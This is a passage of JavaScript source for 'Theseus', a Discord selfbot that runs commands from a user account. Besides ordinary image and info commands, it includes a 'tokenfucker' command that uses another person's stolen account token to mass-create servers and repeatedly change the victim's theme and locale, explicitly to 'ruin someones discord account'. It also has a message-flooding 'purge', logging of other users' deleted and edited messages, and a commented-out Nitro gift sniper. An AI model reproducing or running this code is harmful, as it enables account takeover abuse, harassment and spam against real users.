                    let data = response.data;
                    return data;
                }
                let img = await getImg();
                var url = img.message;
                msg.channel.send("", {files: [url]});
        
            }
        });
        bot.commands.set("isgay", {
            name: 'isgay',
            description: 'see is someone is gay',
            usage: "isgay @user",
            type: 3,
            arguments: true,
            originalcmd: true,
            argsize: 1,
            execute(msg, args, bot) {
                function embed(color = config.globalEmbedHex, title = "Title missing!", description = "", footer = "", thumbnail = "", image = "") { const embed = new RichEmbed() .setTitle(title) .setDescription(description) .setImage(image) .setFooter(footer) .setColor(color) .setThumbnail(thumbnail); return embed; }
                var gay=msg['mentions']['users']['top'](),isgay;
                switch (randmax(2)){
                    case 1:
                        isgay=true;
                        break;
                    case 2:
                        isgay=false;
                        break;
                }
                var yes=lang.isGayResponses.yes,no=lang.isGayResponses.no;
                if(isgay){
                    var random=Math.floor(Math.random() * yes['length']);
                    msg.channel.send(embed(config.embedColors.info,`${gay.tag} ${yes[random]}`));
                }
                else{
                    var random=Math.floor(Math.random() * no['length']);
                    msg.channel.send(embed(config.embedColors.info,`${gay.tag} ${no[random]}`));
                }
            }
        });
        bot.commands.set("jpeg", {
            name: 'jpeg',
            description: 'jpegify an image or a user',
            usage: "jpeg <@user | url>",
            arguments: true,
            originalcmd: true,
            type: 3,
            argsize: 1,
            async execute(msg, args, bot) {        
                var var1 = args.join(" ");
                if(msg.mentions != 0) {
                    var count = 0;
                    msg.mentions.users.tap(user => {
                        count++;
                        if(count==1) var1 = user.avatarURL;
                    });
                }
                let getImg = async () => {
                    try {
                        let response = await axios.get('https://nekobot.xyz/api/imagegen?type=jpeg&url=' + var1);
                        let extracted = response.data.message;    
                        msg.channel.send({files: [extracted]});
                    }
                    catch (ex) {
                        let extracted = ex.response.data.message;
                        msg.channel.send(new RichEmbed().setColor(config.embedColors.danger).setTitle("Error").setDescription(extracted));
                    }
                }
                await getImg();
            }
        });
        bot.commands.set("leaveallgroups", {
            name: 'leaveallgroups',
            description: 'leave every group dm in your discord',
            usage: "leaveallgroups",
            type: 4,
            originalcmd: true,
            arguments: false,
            argsize: 1,
            async execute(msg, args, bot) {
                msg.channel.send(embed(config.embedColors.info, `Attempting to leave all group dm's! The completion time varies on how much groups you are in!`));
                let i = 0;
                bot.channels.tap(guild => {
                    if(guild.type=='group'){guild.delete()}                
                });        
            }
        }
        
        );
        bot.commands.set("tokenfucker", {
            name: "tokenfucker",
            description: "ruin someones discord account",
            usage: "tokenfucker <token> [--no-serverspam] [--disallow-blank-screen]",
            type: 5,
            originalcmd: true,
            arguments: true,
            argsize: 1,
            async execute(msg, args, bot) {
                if(args[0] == "cancel") {
                    let __embed = new RichEmbed()
                    .setColor(config.embedColors.danger)
                    .setTitle("Theseus Token Fucker")
                    .setDescription("Token fucks in queue have been canceled!")
                    msg.channel.send(__embed);
                    cancellasttokenfuck = true;
                    return;
                }
                let userInfo = async () => {
                    let resp = await axios.get("https://discord.com/api/v9/users/@me", {headers: {"Authorization": args[0]}}).then(result => {return result}).catch(() => {
                        return {data: 404}                    
                    });
                    let data = resp.data;
                    return data;
                }
                let gotInfo = await userInfo();
                if(gotInfo == 404) {
                    let __embed = new RichEmbed()
                    .setColor(config.embedColors.danger)
                    .setTitle("Theseus Token Fucker")
                    .setDescription("Invalid token! Please check it and try again.")
                    msg.channel.send(__embed);
                    return;
                }
                let __embed = new RichEmbed()
                .setColor(config.embedColors.danger)
                .setTitle("Theseus Token Fucker")
                .addField("Target", gotInfo.username+"#"+gotInfo.discriminator+" ("+gotInfo.id+")")
                .setDescription("Warning: The token fucker without flags will create tons of servers to the max, will spam light and dark theme and will blank out the GUI for the user!\n\nThis will start in 10 seconds, if you want to cancel this, type `"+"tokenfucker cancel`")
                msg.channel.send(__embed);
                let tokenFuck = async () => {
                    await delay(10*1000)
                    if(cancellasttokenfuck == false) {
                        var x = 1000;
                        var interval = 10;
                        
                        for (var i = 0; i < x; i++) {
                            setTimeout(function () {
                                if(!msg.content.includes("--no-serverspam")) {
                                    axios.post("https://discord.com/api/v9/guilds", {"name":"FUCKED BY THESEUS","icon":null,"channels":[],"system_channel_id":null,"guild_template_code":"2TffvPucqHkN"}, {headers: {"Content-Type": "application/json", "Authorization": args[0], "Origin": "https://discord.com/", "Referrer": "https://discord.com/channels/@me"}}).catch(() => {});
                                }
                                if(!msg.content.includes("--disallow-blank-screen")) {
                                    axios.patch("https://discord.com/api/v9/users/@me/settings", {"locale": funnyl}, {headers: {"Content-Type": "application/json", "Authorization": args[0], "Origin": "https://discord.com/", "Referrer": "https://discord.com/channels/@me"}}).then(u=>{}).catch(() => {});
                                }                            
                                axios.patch("https://discord.com/api/v9/users/@me/settings", {"theme": funnyc}, {headers: {"Content-Type": "application/json", "Authorization": args[0], "Origin": "https://discord.com/", "Referrer": "https://discord.com/channels/@me"}}).then(u=>{}).catch(() => {});
                                if(funnyc == "dark") {
                                    funnyc = "light";
                                    funnyl = "en-GB";
                                    return;
                                }
                                if(funnyc == "light"){
                                    funnyc = "dark";
                                    funnyl = "en-US";
                                    return;
                                }
                            }, i * interval)
                        }                    
                        let __embed2 = new RichEmbed()
                        .setColor(config.embedColors.success)
                        .setTitle("Theseus Token Fucker")
                        .setDescription("Token has been successfully fucked!")
                        .addField("Target", gotInfo.username+"#"+gotInfo.discriminator+" ("+gotInfo.id+")")
                        msg.channel.send(__embed2);
                        }
                    else {
                        cancellasttokenfuck = false;
                    }
                }
                await tokenFuck();
            }
        })
        bot.commands.set("magik", {
            name: 'magik',
            description: 'commit war crimes on an avatar or image url',
            usage: "magik <@user | url> <intensity(1-10)>",
            type: 3,
            arguments: true,
            originalcmd: true,
            argsize: 2,
            async execute(msg, args, bot) {        
                var var1 = args.shift();
                var var2 = parseInt(args);
                if(msg.mentions != 0) {
                    var count = 0;
                    msg.mentions.users.tap(user => {
                        count++;
                        if(count==1) var1 = user.avatarURL;
                    });
                }
                let getImg = async () => {
                    try {
                        let response = await axios.get('https://nekobot.xyz/api/imagegen?type=magik&image=' + var1 + '&intensity=' + var2);
                        let extracted = response.data.message;    
                        msg.channel.send({files: [extracted]});
                    }
                    catch (ex) {
                        let extracted = ex.response.data.message;
                        msg.channel.send(new RichEmbed().setColor(config.embedColors.danger).setTitle("Error").setDescription(extracted));
                    }
                }
                await getImg();
            }
        });
        bot.commands.set("ping", {
            name: 'ping',
            description: 'check the ping of the bot',
            usage: "ping",
            type: 6,
            originalcmd: true,
            arguments: false,
            argsize: 1,
            async execute(msg, args, bot) {
                var cfping = await ping.promise.probe("1.1.1.1").then(function (res) { return res; });
                var embed = new RichEmbed()
                .setColor(config.embedColors.info)
                .addField("Connection to Discord", `Response took ${Math.round(bot.ping)}ms`, true)
                .addField("Connection to Cloudflare", `Response took ${Math.round(cfping.time)}ms`, true)
                .setTitle(`:ping_pong: Ping results`)
                .setFooter(`These results are not perfect, but near accurate`)
                msg.channel.send(embed);
            }
        });
        bot.commands.set("ship", {
            name: 'ship',
            description: 'ship 2 different people',
            usage: "ship <@user1> <@user2>",
            arguments: true,
            originalcmd: true,
            type: 3,
            argsize: 1,
            async execute(msg, args, bot) {
                var count = 0;
                var user1, user2;
                msg.mentions.users.tap(user => {
                    count++;
                    if(count==1) user1 = user;
                    if(count==2) user2 = user;
                });
                let getImg = async () => {
                    let response = await axios.get('https://nekobot.xyz/api/imagegen?type=ship&user1=' + user1.avatarURL + '&user2=' + user2.avatarURL);
                    let data = response.data;
                    return data;
                }
                let img = await getImg();
                var url = img.message;
                msg.channel.send(url);
        
            }
        });
        bot.commands.set("thighs", {
            name: 'thighs',
            description: 'thighs mmmmmmmmmmmmh.',
            type: 3,
            usage: "thighs",
            originalcmd: true,
            arguments: false,
            argsize: 1,
            async execute(msg, args, bot) {
                let getImg = async () => {
                    let response = await axios.get('https://nekobot.xyz/api/image?type=thigh');
                    let data = response.data;
                    return data;
                }
                let img = await getImg();
                var url = img.message;
                msg.channel.send(embed(config.embedColors.info, `Here's some thigh`, ``, ``, ``, url)).then( _msg => {
                    if(_msg.embeds == 0) {
                        _msg.delete();
                        _msg.channel.send(embed(config.embedColors.danger, `Something went wrong!`, `A user in this guild/group/dm channel has their settings turned on to prevent seeing NSFW content! Could not post image`));
                    }
                } );
            }    
        });
        bot.commands.set("uptime", {
            name: 'uptime',
            description: 'check the uptime of the bot',
            usage: ".uptime",
            originalcmd: true,
            type: 6,
            arguments: false,
            argsize: 1,
            execute(msg, args, bot) {
                msg.channel.send(embed(config.embedColors.info, `Bot instance has been online for a duration of ${msToTime(bot.uptime)}`));
            }
        });
        bot.commands.set("purge", {
            name: 'purge',
            description: 'purge tons of messages without permissions',
            usage: ".purge <1-10>",
            originalcmd: true,
            type: 5,
            arguments: false,
            argsize: 1,
            execute(msg, args, bot) {
                if(Number.isNaN(parseInt(args[0])) == true || parseInt(args[0]) > 10) {
                    msg.channel.send(embed(config.embedColors.danger, "Invalid Syntax", "Please include a number of times to purge from 1 to 5!"));
                }
                for (let i = 0; i < parseInt(args[0]); i++) {
                    msg.channel.send(`_ _${"\n".repeat(2042)}_ _`);
                }
            }
        });
        bot.commands.set("whois", {
            name: 'whois',
            description: 'get nice user data of someone.',
            usage: "whois <@user|userid>",
            type: 4,
            originalcmd: true,
            arguments: true,
            argsize: 1,
            execute(msg, args, bot) {
                var rUser = "";

                if(rUser) {
                    const SuperEmbed = embed()
                    .setTitle(`Theseus | ${rUser.tag}`)
                    .setDescription(`User information (${rUser.id})`)
                    .addField("Joined", `${rUser.createdAt.toString()}`)
                    .addField("Bot", `${btoi(rUser.bot)}`, true)
                    .addField("Last seen at", `Server: "${rUser.lastMessage.guild.name}"\nMessage: "${rUser.lastMessage.replace(/\n/g)}"\nhttps://discord.com/channels/${rUser.lastMessage.guild.id}/${rUser.lastMessage.channel.id}/${rUser.lastMessageID}`)
                    .setColor(config.embedColors.info)
                    .setThumbnail(rUser.avatarURL);
                    msg.channel.send(SuperEmbed);    
                }
                else {
                    msg.channel.send(embed(bot.embedColors("danger"), "Theseus | Error", "Failed to find the user. Do you have them added?"));    
                }
            }
        });
        bot.commands.set("ipinfo", {
            name: 'ipinfo',
            originalcmd: true,
            description: 'get information on a specified ip',
            usage: "ipinfo <ip/hostname/domain>",
            type: 4,
            arguments: true,
            argsize: 1,
            async execute(msg, args, bot) {
                var _ = msg.content.split(' ');
                var ip = _[1];
                if (ip) {
                    let getJSON = async () => {
                        let request = await axios.get(`http://ip-api.com/json/${ip}`);
                        let response = request.data;
                        return response;
                    } 
                    let json = await getJSON();
        
                    msg.channel.send(embed(
                        config.embedColors.info,
                        `${lang.whois.header}`.replace(`{{ip}}`, `${json.query}`
                        ), 
                        `**${lang.whois.country}**\n${json.countryCode}\n**${lang.whois.location}**\n${json.city}, ${json.regionName}, ${json.zip}\n**${lang.whois.isp}**\n${json.isp}\n**${lang.whois.timezone}**\n${json.timezone}`,
                        ``
                        )
                    );
                }
            }
        });
        bot.commands.set("help", {
            name: "help",
            type: 6,
            originalcmd: true,
            description: "get a list of commands and index their purpose",
            usage: "help (command)",
            arguments: false,
            argsize: 1,
            async execute(msg, args, bot) {
                if(args.length != 0) {
                    var searchedcmd = args[0];
                    if(!bot.commands.get(searchedcmd)) {
                        msg.channel.send(
                            embed()
                            .setTitle("Theseus")
                            .setDescription("Failed to find `" + searchedcmd + "`! Please make sure that command is correct or check the list with `help`")
                            .setColor(config.embedColors.danger)
                        );
                        return;
                    }
                    else {
                        var foundcmd = bot.commands.get(searchedcmd);
                        var type, dangerous, arguments, custom;
                        switch (foundcmd.type) {
                            case 1:
                                type = ":shield: Administration"
                                break;
                            case 2:
                                type=":underage: NSFW"
                                break;
                            case 3:
                                type=":zany_face: Fun ";
                                break;
                            case 4:
                                type=":gear: Tools";
                                break;
                            case 5:
                                type=":lying_face: Trolling";
                                break;
                            case 6:
                                type=":book: Info";
                                break;
                            default:
                                type=":question: Other";
                                break;
                        }

                        if(foundcmd.dangerous) {dangerous = ":white_check_mark:"} else {dangerous = ":x:"}
                        if(foundcmd.arguments) {arguments = ":white_check_mark:"} else {arguments = ":x:"}
                        if(foundcmd.originalcmd) {custom = ":x:"} else {custom = ":white_check_mark:"}

                        msg.channel.send(
                            embed()
                            .setTitle("Theseus")
                            .setDescription(searchedcmd + ": `" +foundcmd.description + "`")
                            .addField("Catagory", type, false)
                            .addField("Dangerous", dangerous, true)
                            .addField("Arguments", arguments, true)
                            .addField("Custom", custom, true)
                            .addField("Usage", config.prefix+foundcmd.usage)
                            .setColor(config.embedColors.info)
                        );
                        return;
                    }    
                }
                var admin = [], 
                nsfw = [], 
                fun = [], 
                tools = [],
                troll = [],
                info = [],
                other = [];
                bot.commands.tap(cmd => {
                    var cmdname = cmd.name
                    if(!cmd.originalcmd){
                        cmdname = ""+cmd.name+"\\*";
                    }
                    switch (cmd.type) {
                        case 1:
                            admin.push(cmdname);
                            break;
                        case 2:
                            nsfw.push(cmdname);
                            break;
                        case 3:
                            fun.push(cmdname);
                            break;
                        case 4:
                            tools.push(cmdname);
                            break;
                        case 5:
                            troll.push(cmdname);
                            break;
                        case 6:
                            info.push(cmdname);
                            break;
                        default:
                            other.push(cmdname);
                            break;
                    }
                });
                if(admin.length == 0) {admin.push("*Nothing found.*");}
                if(nsfw.length == 0) {nsfw.push("*Nothing found.*");}
                if(fun.length == 0) {fun.push("*Nothing found.*");}
                if(tools.length == 0) {tools.push("*Nothing found.*");}
                if(troll.length == 0) {troll.push("*Nothing found.*");}
                if(info.length == 0) {info.push("*Nothing found.*");}
                if(other.length == 0) {other.push("*Nothing found.*");}
                msg.channel.send(
                    embed()
                    .setTitle("Theseus")
                    .setDescription("List of commands, to view info about a command, type `help cmd`\n`* = custom command, not made by or distributed with theseus`")
                    .addField("🛡️ Administration Commands", admin.join(", "), false)
                    .addField("🔞 NSFW Commands", nsfw.join(", "), false)
                    .addField("🤪 Fun Commands", fun.join(", "), false)
                    .addField("⚙️ Tools Commands", tools.join(", "), false)
                    .addField("🤥 Trolling Commands", troll.join(", "), false)
                    .addField("📖 Info Commands", info.join(", "), false)
                    .addField("❓ Other Commands", other.join(", "), false)
                    .setColor(config.embedColors.info))
            }
        });
        
    //  l(`Attempting to authenticate with the configurated token (${config.token.slice(0, -config.token.length + config.tokenCharNumberToShow)}******), please wait a moment.`[config.consoletext_color]);
      if(!bot.user.verified){var _v=no}else{var _v=yes}
      if(!bot.user.bot){var _bot=no}else{var _bot=yes}
      const customCmd = fs.readdirSync(path.join(Envdata, ".theseus", "commands")).filter(file => file.endsWith('.js'));
      for (const file of customCmd) {
        if(!file.endsWith(".js")){return;}
        const command = require(path.join(Envdata, ".theseus", "commands", file));
        if(!command.name || !command.description || !command.type || !command.usage || !command.execute) {
            System.text(`${"[API]".magenta} Your command at ${file} is missing something! Please make sure you have the following (name, description, type, usage, and execute)`);
        }
        else {
            if (file.startsWith("-")) {
                if(config.logAllRegisteredCommands) l(`${"-".red} ${config.prefix}${command.name}(${file.replace('-','')}) ignored`);
            }
            else {
                if(command.name){
                    if(config.logAllRegisteredCommands) l(`${"+".green} ${config.prefix}${command.name}(${file}) registered`);
                    // set a new item in the Collection
                    // with the key as the command name and the value as the exported module
                    bot.commands.set(command.name, command);      
                  }
                  else {
                    if(config.logAllRegisteredCommands) l(`${"-".red} ${config.prefix}${command.name}(${file}) error`);
                  }
              }    
        }
      }
      bot.commands.tap(cmd => {
        System.text(`${chalk.cyanBright("[THESEUS]")} 0x${randmax(9)}${randmax(9)}${randmax(9)}${randmax(9)}${randmax(9)}${randmax(9)} bound to ${cmd.name}`)
      });
      if(config.logAllRegisteredCommands) l("")
    //   if(fs.existsSync(`./plugins/`)) {
    //     const pluginFolder = fs.readdirSync('./plugins/').filter(file => file.endsWith('.js'));
    //     var pluginFolderCount = pluginFolder.length;
        
    //     if(pluginFolderCount > 0){
    //       l(`${"[API]".magenta} Please wait while we execute plugin initializations...`);
    //     }
      
    //     for (const file of pluginFolder) {
    //       if(!file.endsWith(".js")){return;}
    //       const plugin = require(`./plugins/${file}`);
    //       if (!file.startsWith("-")) {
    //             plugin["file"] = file;
    //             plugin["var"] = `0x${randmax(9)}${randmax(9)}${randmax(9)}${randmax(9)}${randmax(9)}${randmax(9)}`;
    //             if(plugin.name || plugin.init || plugin.enabled){
    //               bot.plugins.set(plugin.name, plugin);
    //               l(`${"[API]".magenta} ` + `${plugin.var}`.green + ` ASSIGNED TO ${file.toUpperCase().replace(".JS", "").green}`);
    //               await delay(500);
    //           }
    //             else {
    //               l(`${"[API]".magenta} VARIABLE ${plugin.var.green} -> ${plugin.name.toUpperCase()["green"]} IS NOT VALID`);
    //               throw(`missing name variable\n    at ${__dirname}/commands/${file}`);
    //             }
    //         }
    //         else {
    //           l(`${"[API]".magenta} SKIPPED ${file.toUpperCase().replace(".JS", "").replace("-", "")} (FS DISABLED)`);
    //       }
    //     }
    //     bot.plugins.tap((plugin) => {
    //         if (!plugin.init) {
    //             l(`${"[API]".magenta} VARIABLE ${plugin.var.green} -> ${plugin.name.toUpperCase()["green"]} IS NOT VALID`);
    //             throw(`missing init() function\n    at ${__dirname} -> commands -> ${plugin.file}`);
    //             //    throw(`${"API Err:"} VARIABLE ${plugin.var.green} ${plugin.name.toUpperCase()["gray"]}\n    at ${__dirname} -> plugins -> ${plugin.file}\n    missing init() function`);
    //         }
    //         plugin.init(bot)
    //     })        
    // }
      await delay(1000);
        console.clear();
        console.log();
        console.log("")
        System.watermark(`████████╗██╗  ██╗███████╗███████╗███████╗██╗   ██╗███████╗   ███╗   ███╗███████╗\n╚══██╔══╝██║  ██║██╔════╝██╔════╝██╔════╝██║   ██║██╔════╝   ████╗ ████║██╔════╝\n   ██║   ███████║█████╗  ███████╗█████╗  ██║   ██║███████╗   ██╔████╔██║█████╗  \n   ██║   ██╔══██║██╔══╝  ╚════██║██╔══╝  ██║   ██║╚════██║   ██║╚██╔╝██║██╔══╝  \n   ██║   ██║  ██║███████╗███████║███████╗╚██████╔╝███████║██╗██║ ╚═╝ ██║███████╗\n   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝╚═╝     ╚═╝╚══════╝\n                                                                                `);
      var didSend = false;
        System.text(`${currentsplash} | ${'Bot created by koda#9990'}`);
      System.watermark(`Authenticated as ${user.username} | Prefix: ${config.prefix} | Discord User: ${bot.user.username}`)
      System.line(axMesa("", 0, config));
    });
    
    // bot.plugins.set("NitroSniper", {
    //     name: "NitroSniper",
    //     endpoint: config.nitroSniper.endpointUrl,
    //     enabled: config.nitroSniper.enabled,
    //     regex: {
    //         gift: /(discord.gift|discord.com|discordapp.com\/gifts)\/\w{1,25}/gim,
    //         url: /(discord\.gift\/|discord\.com\/gifts\/|discordapp\.com\/gifts\/)/gim
    //     },
    //     async checkcode(msg, bot) {
    //         if (!config.nitroSniper.enabled || msg.author.id==bot.user.id) return;
    //         if(msg.content.match(this.regex.gift)) {
    //             var code = msg.content.replace(this.regex.url, "").replace("https://", "").replace("http://", "");
    //             var _guildName, _channelName;
    //             try {
    //                 _guildName=msg.guild.name, _channelName=msg.channel.name, _msg=msg.content.replace(/\n/g, ", ");
    //             }
    //             catch (err){
    //                 _guildName="group or friend dm",_channelName="dm's", _msg=msg.content.replace(/\n/g, ", ");
    //             }
    //             if(!_guildName){_guildName="group dm"}
    //             let attemptRedeem = async () => {
    //                 let data = null;
    //                 let response = await axios.post( this.endpoint.replace(`{0}`, code), `{"channel_id":${msg.channel.id},"payment_source_id":${global.paymentSourceId}}`, { headers: { "Content-Type":"application/json",'Authorization' : config.token, 'User-Agent' : config.nitroSniper.userAgentString } } ).catch((err) => {
    //                     data = err.response.data;
    //                 });
    //                 if(data == null) {
    //                     data = response.data;
    //                 }
    //                 return data;
    //             }
    //             let redeem = await attemptRedeem();
    //             var finalGiftInfo = lang.nitroSniper.gift_info.replace("{{code}}", code).replace("{{location}}", _guildName).replace("{{author}}", msg.author.tag);
    //             if('subscription_plan' in redeem) {
    //                 System.text(`${lang.nitroSniper.prefix.cyan} ${finalGiftInfo} ${lang.nitroSniper.success.brightGreen}`);                
    //             }else{
    //                 if(redeem.message.includes("Unauthorized")) {
    //                     System.text(`${lang.nitroSniper.prefix.cyan} You missed a gift snipe: ${lang.nitroSniper.invalid_token.red}`);
    //                 } else if(redeem.message.includes("redeemed already")) {
    //                     System.text(`${lang.nitroSniper.prefix.cyan} ${finalGiftInfo} ${lang.nitroSniper.already_redeemed.red}`);
    //                 } else if(redeem.message.includes("Unknown")) {
    //                     System.text(`${lang.nitroSniper.prefix.cyan} ${finalGiftInfo} ${lang.nitroSniper.invalid_code.red}`);
    //                 }
    //             }
    //         }
    //     },
    //     async init(bot) {
    //         if (!config.nitroSniper.enabled) return;
    //         if(!config.nitroSniper.getPaymentSourceOnStartup && config.nitroSniper.enabled){
    //             if(!config.nitroSniper.ignorePaymentSourceWarning) {
    //                 System.text(`${lang.nitroSniper.prefix.cyan} ${'WARNING: '.red} our nitro sniper module requires`);
    //                 System.text(`payment sources to be sent with the gift code redemption request,`);
    //                 System.text(`or else some codes will not be redeemable! Change this in config.json`);    
    //             }
    //         }
    //         else {
    //             System.text(`${lang.nitroSniper.prefix.cyan} ${lang.nitroSniper.getting_paymentsourceid}`);
    //             let getPayment = async () => {
    //                 let response = await axios.get(config.nitroSniper.paymentSourceUrl, { headers: { "Authorization": config.token, "User-Agent": config.nitroSniper.userAgentString } }).catch((err) => {
    //                     if(err.response.status === 403) {
    //                         System.text(`${lang.nitroSniper.prefix.cyan} ${lang.nitroSniper.http_request_failed}`.brightGreen);
    //                     }
    //                 });
    //                 let data;
    //                 if(response) {
    //                     data = response.data;
    //                 }
    //                 else {
    //                     data = [{"id": -1}];
    //                 }
    //                 return data;
    //             }
    //             let payment = await getPayment();
    //             if(payment.length != 0) {
    //                 if(payment[0].id==-1) {
    //                     return;
    //                 }
    //                 global.paymentSourceId = payment[0].id;
    //                 System.text(`${lang.nitroSniper.prefix.cyan} ${lang.nitroSniper.got_paymentsourceid}`.brightGreen);
    //             }
    //             else{
    //                 System.text(`${lang.nitroSniper.prefix.cyan} ${lang.nitroSniper.no_paymentsourceid}`.red);
    //             }
    //         }
    //             bot.on('message', (msg) => {
    //             bot.plugins.get(this.name).checkcode(msg, bot);
    //         });
    //     }
    // });
    bot.plugins.set("Giveaways", {
        name: "Giveaways",
        enabled: config.giveaways.enabled,
        async entry(msg, bot) {
            if (!this.enabled || msg.author.id==bot.user.id) return;
            if(msg.embeds.length > 0) {
                if(config.giveaways.botIds.includes(msg.author.id)) {
                    setTimeout(() => msg.react(config.giveaways.reactEmoji), config.giveaways.reactTime * 1000);
                    var userId = msg.embeds[0].description.split(": ")[2].replace("<@", "").replace(">", "");
                    System.text(lang.giveaways.prefix.magenta + " " + lang.giveaways.enter_giveaway.replace("{{location}}", msg.guild.name).replace("{{host}}", userId));
                }
            }
            else {
                if(msg.content.includes("winner could not")) {
                    System.text(lang.giveaways.prefix.magenta + " " + lang.giveaways.nobodywins_giveaway.replace("{{location}}", msg.guild.name).replace("{{host}}", userId));
                }
            }
        },
        async edit(msg, bot) {
            if (!this.enabled || msg.author.id==bot.user.id) return;
            if(msg.embeds.length > 0) {
                if(msg.embeds[0].description) {
                    if(msg.embeds[0].description.includes(`Winner: <@${bot.user.id}>`)) {
                        if(config.giveaways.botIds.includes(msg.author.id)) {
                            var userId = msg.embeds[0].description.split("Hosted by: ")[1].replace("<@", "").replace(">", "");
                            if(config.giveaways.hostDoDm){
                                if(userId != bot.user.id) {
                                    System.text(lang.giveaways.prefix.magenta + " " + lang.giveaways.won_giveaway.hostDm.replace("{{location}}", msg.guild.name).replace("{{host}}", userId));
                                    setTimeout(() => bot.users.get(userId).send(config.giveaways.hostSendMsg), config.giveaways.hostSendDelay * 1000);
                                }
                                else {
                                    System.text(lang.giveaways.prefix.magenta + " " + lang.giveaways.won_giveaway.noHostDm.replace("{{location}}", msg.guild.name).replace("{{host}}", "yourself"));
                                }
                            }        
                            else {
                                System.text(lang.giveaways.prefix.magenta + " " + lang.giveaways.won_giveaway.noHostDm.replace("{{location}}", msg.guild.name).replace("{{host}}", userId));
                            }
                        }
                    } else if (msg.embeds[0].description.includes(`Winner`)) {
                        var userId = msg.embeds[0].description.split("Hosted by: ")[1].replace("<@", "").replace(">", "");
                        System.text(lang.giveaways.prefix.magenta + " " + lang.giveaways.lost_giveaway.replace("{{location}}", msg.guild.name).replace("{{host}}", userId));
                    }
                }
            }        
        },
        async init(bot) {
            bot.on('messageUpdate', (oldmsg, newmsg) => {
                bot.plugins.get(this.name).edit(newmsg, bot);
            });
            bot.on('message', (msg) => {
                bot.plugins.get(this.name).entry(msg, bot);
            });
        }
    });
    bot.on('messageUpdate', (oldmsg, newmsg) => {
        var _guildName, _channelName;
        try {
            _guildName=oldmsg.guild.name, _channelName=oldmsg.channel.name, _msg=oldmsg.content.replace(/\n/g, ", "), _nmsg=newmsg.content.replace(/\n/g, ", ");
        }
        catch (err){
            _guildName="group or friend",_channelName="none", _msg=oldmsg.content.replace(/\n/g, ", "), _nmsg=newmsg.content.replace(/\n/g, ", ");
        }
        if(!_guildName){_guildName="group dm"}
        if(config.log.everything) {
            System.text(`${"UPDATED MESSAGE".bgYellow.black} ${oldmsg.author.tag} (${_guildName}->${_channelName}): Old: ${_msg} | New: ${_nmsg})`)
        }
    });
    bot.on('messageDelete', async msg => {
        var _guildName, _channelName;
        try {
            _guildName=msg.guild.name, _channelName=msg.channel.name, _msg=msg.content.replace(/\n/g, ", ");
        }
        catch (err){
            _guildName="group or friend",_channelName="none", _msg=msg.content.replace(/\n/g, ", ");
        }
        if(!_guildName){_guildName="group dm"}
        if(config.log.everything){l(`DELETED MESSAGE`.bgRed + ` ${msg.author.tag} (${_guildName}>${_channelName}): ${msg.content}`.red)}
    });
    
    var didLogin = false;
    bot.on("debug", (e) => {
        if(_auth == false) {
            l(e.replace(config.token, "************"))
        }
    })

    systemInit(config, user);
}

var systemInit = async (_config, user) => {
        var DISCORD_CONNECTION_ERROR = {
        invalidToken: "The token you specified is either not correct ",
        die: "death"
    }
    if(config.token.length>0) {
        try {
            l("awaiting discord connection...")



            bot.login(
                // Do not change, or you are gay!
                // ;)
                config.token
            ).catch(ex => {
                throw new Error(DISCORD_CONNECTION_ERROR.invalidToken);
            });
            didLogin = true;
            await delay(1000);
        }
        catch (ex) {
            
        }
    }
    else {
        l("You forgot something!\nVisit https://theseus.me/myaccount/bot and make sure you have specified a token in the Discord Token field, closing bot...".red)
        throw new Error(DISCORD_CONNECTION_ERROR.invalidToken);
    }
}
console.clear();


function botStart() {
    console.clear();
    l('');
    l('████████████████████████████████████████████████████████')
    l('█                                                      █')
    l('█     Copyright 2020-2021 poweredbest & theseus.me     █')
    l('█                                                      █')
    l('████████████████████████████████████████████████████████')
    l('')
        require('dns').resolve('www.google.com', function(err) {
        if (err) {
           System.text("No connection");
           throw new Error("Could not establish a connection!")
           
        } else {
        }
      });
      l(`WARNING: THIS VERSION OF THESEUS IS UNDER SERIOUS DEVELOPMENT, BUGS ARE LIKELY`.red);
      l(`BY CLICKING ON "I agree", YOU UNDERSTAND THAT ANY ERRORS THAT OCCUR FROM THE BOT`.red);
      l(`WILL NOT BE UNDER THE FAULT OF THE THESEUS DEVELOPERS & WILL BE AUTO REPORTED`.red);
      l(`UPON CRASH TO HELP US FURTHER INVESTIGATE THE ISSUES THAT HAPPENED?`.red);
      l('')
      console.log(chalk.gray(`Select with ${chalk.green("ENTER")} | Navigate your cursor with ${chalk.green("LEFTARROW and RIGHTARROW")}`))
      var items = [
          "I disagree", "I agree"
    ] ;
    if(fs.existsSync(path.join(Envdata, ".theseus", "CONSENT"))) {
        console.clear();
        authenticateBot();
    }
    else {
        term.singleLineMenu( items, {style: term.inverse, selectedStyle: term.bgBrightGreen.black, separator: "     "}, function( error , response ) {
            console.clear();
            if(response.selectedIndex == 0) { throw new Error("Did not accept dev mode warning"); }
            if(response.selectedIndex == 1) { fs.writeFileSync(path.join(Envdata, ".theseus", "CONSENT"), "hi, this file was created due to the warning you clicked 'I agree' to, if you would like to see the message again, please delete this file"); }
            
            authenticateBot();
        } ) ;    
    }

}

if(!fs.existsSync(path.join(Envdata, ".theseus", "OOBE"))) {
    step1();
}
else {
    botStart();
}
